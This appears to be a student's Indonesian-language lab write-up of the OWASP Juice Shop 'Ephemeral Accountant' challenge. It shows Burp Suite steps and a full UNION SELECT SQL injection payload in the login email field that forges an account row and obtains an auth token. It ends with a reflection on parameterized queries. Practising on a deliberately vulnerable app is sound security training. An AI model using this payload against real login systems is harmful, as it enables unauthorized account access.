# **6. Ephemeral Accountant**

## **6.1 [Soal]**
Login sebagai user Ephemeral Accountant (akun khusus sementara) dengan memanfaatkan SQL Injection di halaman login.

## **6.2 [Link resource untuk latihan]**
`https://juice-shop.herokuapp.com/#/login`

## **6.3 [Jawaban + Bukti]**
- **Step-by-step yang sudah dicoba:**
    1. Klik menu **Account** di pojok kanan atas → **Login**.
    2. Buka link resource di **Burp Suite → Proxy → Open Browser** → pastikan **Intercept On**.
    3. Masuk ke tab **Proxy → HTTP history** dan cari request `POST` dengan URL `/rest/user/login`.
    4. Klik kanan → **Send to Repeater** → lalu klik **Send**.
    5. Pada tab **Repeater**, modifikasi body JSON di parameter `email` dengan payload `UNION SELECT` berikut:
       ```json
       {
         "email": "' UNION SELECT * FROM (SELECT 1,'acc0unt4nt@juice-sh.op','ephemeral_acc','dummyPass123','accounting','safeAnswer','192.168.0.77','/assets/public/images/uploads/default.svg','',0,1,1,1)--",
         "password": "doesntmatter"
       }
       ```
       → klik **Send**.
    6. Perhatikan response: jika berhasil, server akan mengembalikan **token autentikasi** (`Authorization: Bearer ...`) untuk akun `acc0unt4nt@juice-sh.op`.
    7. Gunakan token tersebut untuk mengakses halaman yang hanya bisa diakses setelah login.

- **Screenshot terminal/browser:**
<img width="1920" height="1020" alt="Screenshot 2025-09-10 164912" src="https://github.com/user-attachments/assets/898c0795-c69d-4d33-b04a-0a1aa8dead50" />
<img width="1920" height="1020" alt="Screenshot 2025-09-10 200207" src="https://github.com/user-attachments/assets/bdbd51de-b2a3-4403-bbea-c468118bcc51" />
<img width="1920" height="1020" alt="Screenshot 2025-09-10 195306" src="https://github.com/user-attachments/assets/bc980992-7cb1-4a17-80cc-01ebef9b1ba9" />


- **Catatan hasil percobaan:**
    1. **Hasil:** Berhasil.
    2. **Alasan:** Dengan `UNION SELECT` injection, attacker dapat membuat row palsu yang mengandung email/password tertentu agar sistem percaya bahwa akun itu valid.
    3. **Refleksi:** Kerentanan ini menunjukkan bahayanya query login tanpa parameterized statement, karena attacker bisa menciptakan akun “sementara” yang sebenarnya tidak ada di database.
